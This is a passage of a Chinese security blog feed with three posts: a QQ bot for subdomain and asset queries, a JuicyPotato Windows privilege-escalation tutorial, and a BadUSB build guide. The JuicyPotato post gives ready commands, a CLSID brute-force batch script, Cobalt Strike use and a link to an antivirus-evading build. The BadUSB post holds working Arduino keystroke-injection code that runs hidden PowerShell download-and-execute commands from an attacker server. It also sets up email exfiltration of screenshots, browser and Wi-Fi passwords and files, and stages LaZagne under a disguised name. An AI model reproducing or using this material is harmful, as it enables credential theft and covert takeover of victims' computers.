        <content type="html"><![CDATA[<h2 id="0x01命令及功能演示"><a href="#0x01命令及功能演示" class="headerlink" title="0x01命令及功能演示"></a>0x01命令及功能演示</h2><p>之前为一个论坛写了个文章机器人，最近加上了子域名查询和资产搜集功能（用的自己的付费接口）</p><p>加上这两个功能希望可以方便大家渗透测试和学习使用</p><p>原本希望写一个QQ渗透机器人编写系列的。。但是介于比较合规性上比较敏感和最近缺乏时间，日后再动工</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191657535.png" alt="image-20230419165737517"></p><p>本机器人QQ号为3609079527，申请添加好友后，机器人自动同意，自动同意加群</p><p>欢迎各位群主&#x2F;群管&#x2F;安全爱好者拉入群中使用（只回复群里）</p><p>拉入群中后，输入命令“帮助”即可查看使用方法<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191658516.png" alt="image-20230419165849492"></p><p>目前支持的命令有</p><p>最新文章</p><p>最热文章</p><p>搜索 xxx</p><p>资产查询 xxx</p><p>子域名查询 xxx</p><h2 id="0x02演示"><a href="#0x02演示" class="headerlink" title="0x02演示#"></a>0x02演示<a href="https://www.secquan.org/Share/1070486#0x002%E6%BC%94%E7%A4%BA">#</a></h2><h3 id="资产查询"><a href="#资产查询" class="headerlink" title="资产查询#"></a>资产查询<a href="https://www.secquan.org/Share/1070486#%E8%B5%84%E4%BA%A7%E6%9F%A5%E8%AF%A2">#</a></h3><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191658590.png" alt="image-20230419165759873"></p><h3 id="子域名查询"><a href="#子域名查询" class="headerlink" title="子域名查询#"></a>子域名查询<a href="https://www.secquan.org/Share/1070486#%E5%AD%90%E5%9F%9F%E5%90%8D%E6%9F%A5%E8%AF%A2">#</a></h3><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191658767.png" alt="image-20230419165817747"></p><p>其他功能在此不过多演示，请各位自行体验</p>]]></content>
      
      
      
        <tags>
            
            <tag> 安全开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>微软不当洞的漏洞-Windows提权神器JuicyPotato</title>
      <link href="/2019/09/13/%E5%BE%AE%E8%BD%AF%E4%B8%8D%E5%BD%93%E6%B4%9E%E7%9A%84%E6%BC%8F%E6%B4%9E-Windows%E6%8F%90%E6%9D%83%E7%A5%9E%E5%99%A8JuicyPotato/"/>
      <url>/2019/09/13/%E5%BE%AE%E8%BD%AF%E4%B8%8D%E5%BD%93%E6%B4%9E%E7%9A%84%E6%BC%8F%E6%B4%9E-Windows%E6%8F%90%E6%9D%83%E7%A5%9E%E5%99%A8JuicyPotato/</url>
      
        <content type="html"><![CDATA[<h2 id="0X00-Juicy-Potato简介"><a href="#0X00-Juicy-Potato简介" class="headerlink" title="0X00-Juicy-Potato简介"></a>0X00-Juicy-Potato简介</h2><p>Juicy Potato江湖人称烂土豆，是在MS16-075漏洞利用工具RottenPotatoN工具的基础上做了扩展（A sugared version of RottenPotatoNG, with a bit of juice, i.e. <strong>another Local Privilege Escalation tool, from a Windows Service Accounts to NT AUTHORITY\SYSTEM</strong>*）</p><p>追根到底是一款Windows的本地提权工具，利用了COM对象进行提权，相比RottenPotatoNG适用范围更加广泛（正如作者所说with a bit of juice）</p><p>使用Juicy Potato这款提权工具的前提是获得了SeImpersonate或者SeAssignPrimaryToken权限，因此带有一定的局限性，对权限有一定要求，并非万能神器</p><p>Juicy Potato的项目官网如下：</p><p><a href="https://github.com/ohpe/juicy-potato">https://github.com/ohpe/juicy-potato</a></p><p>这款提权工具其实早在18年末就有老外开发出来了，但是吧，依然没有进入到很多人的视野中，今天写这篇文章也是站在很多大佬的肩膀上进行总结与开新枝，如有错误，希望大家能及时斧正</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191606699.png" alt="image"></p><h3 id="0x01-Juicy-potato项目功能点"><a href="#0x01-Juicy-potato项目功能点" class="headerlink" title="0x01-Juicy-potato项目功能点"></a>0x01-Juicy-potato项目功能点</h3><h5 id="①Target-CLSID"><a href="#①Target-CLSID" class="headerlink" title="①Target CLSID"></a>①Target CLSID</h5><p>选择你想要的任何CLSID。</p><p>目前作者的官方github项目中已经给出了windows版本的CLSID列表。</p><h5 id="②COM-Listening-port"><a href="#②COM-Listening-port" class="headerlink" title="②COM Listening port"></a><strong>②COM Listening port</strong></h5><p>设置你需要的COM侦听端口</p><h5 id="③COM-Listening-IP-address"><a href="#③COM-Listening-IP-address" class="headerlink" title="③COM Listening IP address"></a><strong>③COM Listening IP address</strong></h5><p>设置COM组件监听的目标ip</p><h5 id="④Process-creation-mode"><a href="#④Process-creation-mode" class="headerlink" title="④Process creation mode"></a><strong>④Process creation mode</strong></h5><p>取决于模拟用户的权限，有以下三个选择：</p><blockquote><p>CreateProcessWithToken (需要SeImpersonate权限)</p><p>CreateProcessAsUser (需要SeAssignPrimaryToken权限)</p><p>both(综合以上两种)</p></blockquote><h5 id="⑤Process-to-launch"><a href="#⑤Process-to-launch" class="headerlink" title="⑤Process to launch"></a><strong>⑤Process to launch</strong></h5><p>如果JuIcy potato利用成功，则启动可执行文件或脚本</p><h5 id="⑥Process-Argument"><a href="#⑥Process-Argument" class="headerlink" title="⑥Process Argument"></a><strong>⑥Process Argument</strong></h5><p>自定义已启动的进程参数</p><h5 id="⑦与远程RPC服务器交互"><a href="#⑦与远程RPC服务器交互" class="headerlink" title="⑦与远程RPC服务器交互"></a>⑦与远程RPC服务器交互</h5><h3 id="0x02-Juicy-Potato局限性"><a href="#0x02-Juicy-Potato局限性" class="headerlink" title="0x02-Juicy-Potato局限性"></a>0x02-Juicy-Potato局限性</h3><p>①当前用户必须具有以下权限中的一种，或者两种同时具备</p><p>SeImpersonate权限</p><p>SeAssignPrimaryToken权限</p><p>以下用户具有该权限：</p><p><strong>·</strong> 本地管理员组成员和本地服务帐户</p><p><strong>·</strong> 由服务控制管理器启动的服务</p><p><strong>·</strong> COM基础结构启动的并配置为在特定帐户下运行的COM服务器</p><h5 id="针对提权的话，主要是第三类用户"><a href="#针对提权的话，主要是第三类用户" class="headerlink" title="针对提权的话，主要是第三类用户"></a>针对提权的话，主要是第三类用户</h5><p>常见的为LocalService用户，例如IIS和者sqlserver的用户</p><p>②开启DCOM,并能找到可用的COM对象</p><p>③开启RPC</p><h3 id="0x03-原理-来自3g大佬"><a href="#0x03-原理-来自3g大佬" class="headerlink" title="0x03-原理(来自3g大佬)"></a>0x03-原理(来自3g大佬)</h3><p><strong>·</strong> LocalService用户默认具有SeImpersonate和SeAssignPrimaryToken权限</p><p><strong>·</strong> 开启SeImpersonate权限后，能够在调用CreateProcessWithToken时，传入新的Token创建新的进程</p><p><strong>·</strong> 开启SeAssignPrimaryToken权限后，能够在调用CreateProcessAsUser时，传入新的Token创建新的进程</p><p>Juicy Potato的实现流程如下：</p><p><strong>1、加载COM，发出请求，权限为System</strong></p><p>在指定ip和端口的位置尝试加载一个COM对象。</p><p>RottenPotatoNG使用的COM对象为BITS，CLSID为{4991d34b-80a1-4291-83b6-3328366b9097}</p><p>可供选择的COM对象不唯一，Juicy Potato提供了多个，详细列表可参考如下地址：</p><p><a href="https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md">https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md</a></p><p><strong>2、回应步骤1的请求，发起NTLM认证</strong></p><p>正常情况下，由于权限不足，当前权限不是System，无法认证成功。</p><p><strong>3、针对本地端口，同样发起NTLM认证，权限为当前用户</strong></p><p>由于权限为当前用户，所以NTLM认证能够成功完成。</p><p>RottenPotatoNG使用的135端口。</p><p>Juicy Potato支持指定任意本地端口，但是RPC一般默认为135端口，很少被修改。</p><p><strong>4、分别拦截两个NTLM认证的数据包，替换数据，通过NTLM重放使得步骤1(权限为System)的NTLM认证通过，获得System权限的Token</strong></p><p>重放时需要注意NTLM认证的NTLM Server Challenge不同，需要修正。</p><p><strong>5、利用System权限的Token创建新进程</strong></p><p>如果开启SeImpersonate权限，调用CreateProcessWithToken，传入System权限的Token，创建的进程为System权限。</p><p>如果开启SeAssignPrimaryToken权限，调用CreateProcessAsUser，传入System权限的Token，创建的进程为System权限</p><h3 id="0x04-在命令行中使用"><a href="#0x04-在命令行中使用" class="headerlink" title="0x04-在命令行中使用"></a><strong>0x04-在命令行中使用</strong></h3><pre><code>D:\&gt;JuicyPotato.exeJuicyPotato v0.1Mandatory args:-t createprocess调用: &lt;t&gt; CreateProcessWithTokenW, &lt;u&gt; CreateProcessAsUser, &lt;*&gt; try both-p &lt;program&gt;: 运行指定程序-l &lt;port&gt;: COM服务器侦听端口Optional args:-m &lt;ip&gt;: COM服务器侦听地址 (默认 127.0.0.1)-a &lt;argument&gt;: 传递给程序命令行参数 (默认 NULL)-k &lt;ip&gt;: RPC服务器IP地址 (默认 127.0.0.1)-n &lt;port&gt;: RPC服务器侦听端口 (默认 135)-c &lt;&#123;clsid&#125;&gt;: CLSID (default BITS:&#123;4991d34b-80a1-4291-83b6-3328366b9097&#125;)-z 仅测试CLSID并打印令牌的用户</code></pre><p><strong>1、查看当前用户权限，是否符合要求</strong></p><p>whoami &#x2F;priv</p><p>如果开启SeImpersonate权限，juicypotato的参数可以使用-t t</p><p>如果开启SeAssignPrimaryToken权限，juicypotato的参数可以使用-t u</p><p>如果均开启，可以选择-t *</p><p>如果均未开启，那么无法提权。</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191607994.png" alt="image"></p><p><strong>2、查看RPC默认端口是否为135</strong></p><p>如果被修改(例如为111)，juicypotato的参数可以使用-n 111指定RPC端口</p><p>如果系统禁用了RPC，并不是一定无法提权，需要满足如下条件：</p><p>找到另一系统，能够以当前用户的权限进行远程RPC登录，此时juicypotato的参数可以使用-k <ip></p><p>Windows默认配置下，允许135端口的入站规则即可进行远程RPC登录。</p><p>添加防火墙规则允许135端口入站的命令如下：</p><p>netsh advfirewall firewall add rule name&#x3D;”135” protocol&#x3D;TCP dir&#x3D;in localport&#x3D;135 action&#x3D;allow</p><p><strong>3、选择可用的CLSID</strong></p><p>参考列表</p><p><a href="https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md">https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md</a></p><p>根据你的系统类型选择CLSID（EG:{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}）</p><p>然后-c指定即可 </p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191607177.png" alt="image"></p><p>相关系统使用的CLSID文末都给大家打包了</p><p><strong>4、选择一个系统未占用的端口作为监听端口</strong></p><p>-l参数指定即可</p><p>例如，最终参数如下：</p><p>JuicyPotato.exe -t t -p c:\windows\system32\cmd.exe -l 1111 -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}）</p><p>即使用SeImpersonate权限创建进程，监听端口1111，使用的CLSID为{8BC3F05E-D86B-11D0-A075-00C04FB68820}来进行提权</p><h5 id="5-执行效果"><a href="#5-执行效果" class="headerlink" title="5.执行效果"></a>5.执行效果</h5><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191607830.png" alt="image"></p><h3 id="0x05-在Webshell中使用JuicyPotato"><a href="#0x05-在Webshell中使用JuicyPotato" class="headerlink" title="0x05-在Webshell中使用JuicyPotato"></a>0x05-在Webshell中使用JuicyPotato</h3><p>webshell中使用Juicy-Potato的提权的话</p><p>Juicy potato需要进行一些特殊处理，使其直接返回结果</p><p>实现起来比较简单，在我文章后附有文件JuicyPotato-webshell.exe</p><p>其默认使用的CLSID为{4991d34b-80a1-4291-83b6-3328366b9097}</p><p>直接执行JuicyPotato-webshell.exe -p “whoami”</p><p>或者JuicyPotato-webshell.exe -p “whoami” -c {XXXXX}即可</p><p>执行效果如图</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191607572.png" alt="image"></p><h3 id="0x06-在命令行中批量提取当前系统的CLSID"><a href="#0x06-在命令行中批量提取当前系统的CLSID" class="headerlink" title="0x06-在命令行中批量提取当前系统的CLSID"></a>0x06-在命令行中批量提取当前系统的CLSID</h3><p>官方给出的code如下</p><pre><code class="powershell">&lt;#This script extracts CLSIDs and AppIDs related to LocalService.DESCRIPTIONThen exports to CSV#&gt;$ErrorActionPreference = &quot;Stop&quot;# Importing some requirements. .\utils\Join-Object.ps1New-PSDrive -Name HKCR -PSProvider Registry -Root HKEY_CLASSES_ROOT$CLSID = Get-ItemProperty HKCR:\clsid\* | select-object AppID,@&#123;N=&#39;CLSID&#39;; E=&#123;$_.pschildname&#125;&#125; | where-object &#123;$_.appid -ne $null&#125;$APPID = Get-ItemProperty HKCR:\appid\* | select-object localservice,@&#123;N=&#39;AppID&#39;; E=&#123;$_.pschildname&#125;&#125; | where-object &#123;$_.LocalService -ne $null&#125;$RESULT = Join-Object -Left $APPID -Right $CLSID -LeftJoinProperty AppID -RightJoinProperty AppID -Type AllInRight  | Sort-Object LocalService# Preparing to Output$OS = (Get-WmiObject -Class Win32_OperatingSystem | ForEach-Object -MemberName Caption).Trim() -Replace &quot;Microsoft &quot;, &quot;&quot;$TARGET = $OS -Replace &quot; &quot;,&quot;_&quot;# Make target folderNew-Item -ItemType Directory -Force -Path .\$TARGET# Output in a CSV$RESULT | Export-Csv -Path &quot;.\$TARGET\CLSIDs.csv&quot; -Encoding ascii -NoTypeInformation# Export CLSIDs list$RESULT | Select CLSID -ExpandProperty CLSID | Out-File -FilePath &quot;.\$TARGET\CLSID.list&quot; -Encoding ascii# Visual Table$RESULT | ogv</code></pre><p>部分系统中是无法正常提取的，会报错</p><p>在此贴上笔者修复的powershell提取脚本</p><pre><code>New-PSDrive -Name HKCR -PSProvider Registry -Root HKEY_CLASSES_ROOT | Out-Null$CLSID = Get-ItemProperty HKCR:\clsid\* | select-object AppID,@&#123;N=&#39;CLSID&#39;; E=&#123;$_.pschildname&#125;&#125; | where-object &#123;$_.appid -ne $null&#125;foreach($a in $CLSID)&#123;        Write-Host $a.CLSID&#125;</code></pre><p>直接执行Powershell -ep bypass -f get-clid-2012.ps1即可</p><p>效果如图</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191607804.png" alt="image"></p><h3 id="0x07-在目标机批量验证CLSID提权可用性"><a href="#0x07-在目标机批量验证CLSID提权可用性" class="headerlink" title="0x07-在目标机批量验证CLSID提权可用性"></a>0x07-在目标机批量验证CLSID提权可用性</h3><p>官方给出的批处理脚本经过测试后，问题非常多，本人做了一下修改</p><p>code如下–juicypotato.bat</p><pre><code class="shell">[url=home.php?mod=space&amp;uid=46675]@echo[/url] off:: Starting port, you can change itset /a port=10000SETLOCAL ENABLEDELAYEDEXPANSIONFOR /F %%i IN (CLSID.list) DO (   echo %%i !port!   juicypotato-webshell.exe -c %%i -p &quot;whoami&quot; &gt;&gt; result.log   set RET=!ERRORLEVEL!   :: echo !RET!   if &quot;!RET!&quot; == &quot;1&quot;  set /a port=port+1)</code></pre><p>执行后在同目录下生成一个result.log文件</p><p>记录测试不同CLSID使用烂土豆提权的结果</p><p>效果如图所示</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191607196.png" alt="image"></p><p>随后根据log的相关输出，选择合适的CLSID进行权限提升即可</p><h3 id="0x08-在Cobaltstrike中使用Juicypotato提权"><a href="#0x08-在Cobaltstrike中使用Juicypotato提权" class="headerlink" title="0x08-在Cobaltstrike中使用Juicypotato提权"></a>0x08-在Cobaltstrike中使用Juicypotato提权</h3><p>在Cobaltstrike中使用Juicypotato提取，是使用DLL注入的方式执行Juicypotato实现权限提升</p><p>但是缺陷比较明显，只能使用默认的CLSID({4991d34b-80a1-4291-83b6-3328366b9097})进行提权,如果想使用其他CLSID请参考命令行等执行方法</p><p>下载并解压reflectiveJuicyPotato.zip，在Cobaltstike中选择脚本管理器–&gt;load加载juicypotato.cna脚本</p><p>随后我们在提权模块即可发现多了一个JuicyPotato</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191607449.png" alt="image"></p><p>点击开始后，提权效果如图</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191607632.png" alt="image"></p><p>权限提升至NT AUTHORITY\SYSTEM</p><h3 id="0X09福利-x2F-实验资源下载"><a href="#0X09福利-x2F-实验资源下载" class="headerlink" title="0X09福利&#x2F;实验资源下载"></a>0X09福利&#x2F;实验资源下载</h3><p>本次实验环境中的原版JuicyPotato，JuicyPotato-webshell，Get-CLSID.ps1,批处理文件，Cobaltstrike脚本都已经给大家集成好了</p><p>听说JuicyPotato已经加入豪华全家桶系列？没事，咱有免杀版本</p><p>懂C的兄弟也可以自己修改一下源代码，很好过杀软的</p><p>链接：<a href="https://pan.baidu.com/s/1ZVctJIZnV8yWNWqW1Byqaw">https://pan.baidu.com/s/1ZVctJIZnV8yWNWqW1Byqaw</a> </p><p>提取码：m78s</p><h3 id="0X10-Reference"><a href="#0X10-Reference" class="headerlink" title="0X10 Reference"></a>0X10 Reference</h3><p><a href="https://github.com/ohpe/juicy-potato/tree/master/CLSID/">https://github.com/ohpe/juicy-potato/tree/master/CLSID/</a></p><p><a href="https://github.com/ohpe/juicy-potato">https://github.com/ohpe/juicy-potato</a></p><p><a href="https://3gstudent.github.io/">https://3gstudent.github.io</a></p>]]></content>
      
      
      <categories>
          
          <category> 安全工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅记Badusb窃取凭据的详细制作过程</title>
      <link href="/2019/06/26/%E6%B5%85%E8%AE%B0Badusb%E7%AA%83%E5%8F%96%E5%87%AD%E6%8D%AE%E7%9A%84%E8%AF%A6%E7%BB%86%E5%88%B6%E4%BD%9C%E8%BF%87%E7%A8%8B/"/>
      <url>/2019/06/26/%E6%B5%85%E8%AE%B0Badusb%E7%AA%83%E5%8F%96%E5%87%AD%E6%8D%AE%E7%9A%84%E8%AF%A6%E7%BB%86%E5%88%B6%E4%BD%9C%E8%BF%87%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01-简介"></a>0x01-简介</h2><p>1.概述<br>在2014年美国黑帽大会上，安全研究人员JakobLell和独立安全研究人员Karsten Nohl展示了他们称为“BadUSB”的攻击方法，这种攻击方法让USB安全和几乎所有和USB相关的设备(包括具有USB端口的电脑)都陷入相当危险的状态。<br><a href="https://imgchr.com/i/eACtFU"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191450785.png" alt="eACtFU.png"></a></p><p>2.Badusb内部结构<br><a href="https://imgchr.com/i/eAC0yR"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191450609.png" alt="eAC0yR.png"></a><br>从这张图便可以了解到–Badusb和普通的U盘并没有什么两样，因此迷惑性极高，很容易攻击成功</p><p>3.Badusb Hid攻击原理<br>HID是Human Interface Device的缩写，由其名称可以了解HID设备是直接与人交互的设备，。一般来讲针对HID的攻击主要集中在键盘鼠标上，因为只要控制了用户键盘，基本上就等于控制了用户的电脑。攻击者会把攻击隐藏在一个正常的鼠标键盘中，当用户将含有攻击向量的鼠标或键盘，插入电脑时，恶意代码会被加载并执行。简而言之，今天要介绍的Badusb利用的是虚拟键盘来实现恶意代码的执行。</p><p>4.Badusb攻击优势<br>攻击者将恶意代码存放于Badusb的固件中，PC上的杀毒软件无法访问到U盘存放固件的区域，因此也就意味着杀毒软件无法应对BadUSB的攻击。</p><p>5.Teensy<br>攻击者在定制攻击设备时，会向USB设备中置入一个攻击芯片，此攻击芯片是一个非常小而且功能完整的单片机开发系统，它的名字叫TEENSY。通过TEENSY你可以模拟出一个键盘和鼠标，当你插入这个定制的USB设备时，电脑会识别为一个键盘，利用设备中的微处理器与存储空间和编程进去的攻击代码，就可以向主机发送控制命令，从而完全控制主机，无论自动播放是否开启，都可以成功。<br><a href="https://imgchr.com/i/eACUW4"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191450242.png" alt="eACUW4.png"></a></p><p>6.Arduino<br>Arduino是一款便捷灵活、方便上手的开源电子原型平台。其开发环境，主要包含两个主要的部分：硬件部分是可以用来做电路连接的Arduino电路板；另外一个则是Arduino IDE，你的计算机中的程序开发环境。你只要在IDE中编写程序代码，将程序上传到Arduino电路板后，程序便会告诉Arduino电路板要做些什么了。<br><a href="https://imgchr.com/i/eACdSJ"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191450221.png" alt="eACdSJ.png"></a></p><p>7.攻击流程<br>Bad-Usb插入后，会模拟键盘对电脑进行操作，通过这些操作打开电脑的命令终端，并执行一条命令，这条命令将从指定网址下载恶意代码(通常为powershell脚本)并于后台静默运行。这些代码功能包括：窃取信息、反弹shell、发送邮件等，从而实现控制目标机或者窃取信息的目的。</p><h2 id="0x02-准备工作"><a href="#0x02-准备工作" class="headerlink" title="0x02-准备工作"></a>0x02-准备工作</h2><p>1.硬件<br>我在这边选择的是BS Micro pro micro leonardo Arduino 开发板，结构是一个USB主控加一块到两块的存储颗粒。从原理来看。USB主控就是一个带原生usb接口的单片机。<br>虽然它的体积小，但它拥有丰富接口，使其不仅有传统控制器的功能，还有在电脑上实现鼠标、键盘的功能，串口功能，并且无需驱动，能直接实现与电脑的通信。<br>    它与其他大多数的MCU控制板一个很大的区别是编程不需要额外使用编程器，直接用USB就可以编程。这样不仅方便、稳定、可靠，还省下了一个编程器的钱。 </p><p>淘宝链接:<br><a href="https://item.taobao.com/item.htm?spm=a1z09.2.0.0.3d1f2e8dNaX0hO&id=589099911512&_u=m2i3k6cqf473">https://item.taobao.com/item.htm?spm=a1z09.2.0.0.3d1f2e8dNaX0hO&amp;id=589099911512&amp;_u=m2i3k6cqf473</a></p><p>实际到货设备如图<br><a href="https://imgchr.com/i/eACBO1"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191451688.png" alt="eACBO1.png"></a></p><p>2.开发环境安装<br>Arduino IDE<br><a href="https://imgchr.com/i/eACyTK"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191451614.png" alt="eACyTK.png"></a><br>kali下已集成，windows下载链接：<br><a href="http://downloads.arduino.cc/arduino-1.6.4-windows.zip">http://downloads.arduino.cc/arduino-1.6.4-windows.zip</a><br>下载为zip文件，无需安装，直接解压就能用。<br>注意：不要下载高于1.6.4的版本，否则设备驱动无法正常安装！（我被这个坑乐好一段时间）</p><p>3.驱动准备<br>为了可以正常使用ardunio对开发版进行编程，需安装Teensyduino驱动<br>下载链接<a href="http://www.pjrc.com/teensy/td_123/teensyduino.exe">http://www.pjrc.com/teensy/td_123/teensyduino.exe</a><br><a href="https://imgchr.com/i/eACsw6"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191451655.png" alt="eACsw6.png"></a><br>一路Next下来，本处选择刚刚解压的ardunio1.64路径才可以正常安装<br><a href="https://imgchr.com/i/eACWSH"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191451046.png" alt="eACWSH.png"></a><br>选择all进行安装<br><a href="https://imgchr.com/i/eACcFO"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191451875.png" alt="eACcFO.png"></a></p><p>4.开启smtp服务<br>为确保我们的脚本能够完美地发送包含目标主机信息的邮件，我们需要开启smtp邮箱服务。本处我使用的是QQ邮箱，开启方法如下：<br>进入邮箱，点击设置-账户<br><a href="https://imgchr.com/i/eACgYD"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191452562.png" alt="eACgYD.png"></a></p><p>向下拉即可看到<br><a href="https://imgchr.com/i/eAC2fe"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191452333.png" alt="eAC2fe.png"></a><br>将头两个服务开启，此过程需要验证密保~<br>即可获得“授权码”（即后文提到的邮箱密码）此处的邮箱密码并不是指QQ密码<br><a href="https://imgchr.com/i/eACfld"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191453721.png" alt="eACfld.png"></a></p><p>5.服务器端准备<br>①首先下载Badusb所需代码，代码已打包，见文末<br>②修改压缩包中的main.ps1的2754行，把打码的地方改为自己的服务器IP<br><a href="https://imgchr.com/i/eACQQs"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191453507.png" alt="eACQQs.png"></a></p><p>③修改main.ps1的2903-2919行 为发送邮件配置<br><a href="https://imgchr.com/i/eACKzj"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191453845.png" alt="eACKzj.png"></a></p><p>④修改GetPass.ps1中的前两行，域名，Getpass.rar实际上是lazagne，用rar下载尽量避免出发安全软件，这个不放心可以百度下载。command.rar实为bat 因为 lazagne注入lsass时会被安全软件拦截，所以用bat避免注入。修改GetPass.ps1中的邮箱配置，同main.ps1中的就行<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191453746.png" alt="eAi9KA.png"><br>⑤将修改后的全部文件用HFS（一个简单的提供http下载软件）上传到公网服务器<br>HFS链接：<a href="http://www.ouyaoxiazai.com/soft/stgj/133/21762.html">http://www.ouyaoxiazai.com/soft/stgj/133/21762.html</a><br><a href="https://imgchr.com/i/eACFsI"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191453712.png" alt="eACFsI.png"></a></p><h2 id="0x03-Badusb制作"><a href="#0x03-Badusb制作" class="headerlink" title="0x03-Badusb制作"></a>0x03-Badusb制作</h2><p>1.将硬件插入电脑<br><a href="https://imgchr.com/i/eACCzd"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191453770.png" alt="eACCzd.png"></a></p><p>2.打开Arduino IDE<br>3.工具-&gt;版-&gt;选择“Arduino Leonardo”<br><a href="https://imgchr.com/i/eACiQA"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191453681.png" alt="eACiQA.png"></a></p><p>4.输入Windows +R 输入命令devmgmt.msc打开设备管理器<br>查看串口信息<br><a href="https://imgchr.com/i/eACVdf"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191453575.png" alt="eACVdf.png"></a><br>5.根据之前的串口信息，打开ardunio ide选择–工具-&gt;端口-&gt;选择“COM* (Arduino Leonardo)”<br>6.现在可以看到IDE右下角出现“Arduino Leonardo on COM*”<br><a href="https://imgchr.com/i/eACkLt"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191453630.png" alt="eACkLt.png"></a><br>6.下面进行将代码写入硬件的操作<br>①复制如下代码到ardunio中</p><pre><code>void setup()&#123;//初始化 Keyboard.begin();//开始键盘通讯 delay(5000);//延时 Keyboard.press(KEY_LEFT_GUI);//win键 delay(500);Keyboard.press(&#39;r&#39;);//r键delay(500); Keyboard.release(KEY_LEFT_GUI);Keyboard.release(&#39;r&#39;); Keyboard.press(KEY_CAPS_LOCK);//利用开大写输小写绕过输入法Keyboard.release(KEY_CAPS_LOCK);delay(500);Keyboard.println(&quot;CMD&quot;);delay(500);Keyboard.press(KEY_RETURN); Keyboard.release(KEY_RETURN); delay(3000);Keyboard.println(&quot;powershell -windowstyle hidden IEX (New-Object Net.WebClient).DownloadString(&#39;http://8.8.8.8/main.ps1&#39;) &quot;);Keyboard.press(KEY_RETURN); Keyboard.release(KEY_RETURN);Keyboard.press(KEY_CAPS_LOCK); Keyboard.release(KEY_CAPS_LOCK);Keyboard.end();//结束键盘通讯 Keyboard.begin();//开始键盘通讯 delay(5000);//延时 Keyboard.press(KEY_LEFT_GUI);//win键 delay(500);Keyboard.press(&#39;r&#39;);//r键delay(500); Keyboard.release(KEY_LEFT_GUI);Keyboard.release(&#39;r&#39;); Keyboard.release(KEY_CAPS_LOCK);delay(500);Keyboard.println(&quot;CMD&quot;);delay(500);Keyboard.press(KEY_RETURN); Keyboard.release(KEY_RETURN); delay(3000);Keyboard.println(&quot;powershell -windowstyle hidden IEX (New-Object Net.WebClient).DownloadString(&#39;http://8.8.8.8/payload.ps1&#39;) &quot;);Keyboard.press(KEY_RETURN); Keyboard.release(KEY_RETURN);Keyboard.press(KEY_CAPS_LOCK); Keyboard.release(KEY_CAPS_LOCK);Keyboard.end();//结束键盘通讯 &#125;void loop() &#123;&#125;</code></pre><p>请各位将8.8.8.8改成自己的服务器ip~<br>注释写的应该都很明白了，小伙伴们可以根据自己的需求修改</p><p>PS:我这边选择执行两个payload，第一个是我之前教大家修改上传的main.ps1，这个脚本实现的是“截图、用户凭据导出，文件窃取，计算机中浏览器&#x2F;WIFI等密码的读取”并将其通过邮箱发送到我们手中。</p><p>第二个Payload是我在cobaltstrike里面生成的powershell一句话后门<br><a href="https://imgchr.com/i/eACEeP"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191454216.png" alt="eACEeP.png"></a></p><p>代码大体的意思是：<br>插入BADusb后等待五秒，<br>切换大写绕开输入法<br>按下Windows+R打开cmd<br>模拟输入一个字符串，并回车执行</p><p>当你将代码写入完成后，恭喜你，Badusb已制作成功<br><a href="https://imgchr.com/i/eACZo8"><img src="https://s2.ax1x.com/2019/07/23/eACZo8.png" alt="eACZo8.png"></a></p><h2 id="0x004测试"><a href="#0x004测试" class="headerlink" title="0x004测试"></a>0x004测试</h2><p>将Badusb插入电脑，短暂几秒延时后，发现打开了cmd窗口，输入了我们下载执行powershell的命令，并回车执行<br><a href="https://imgchr.com/i/eACnJg"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191454260.png" 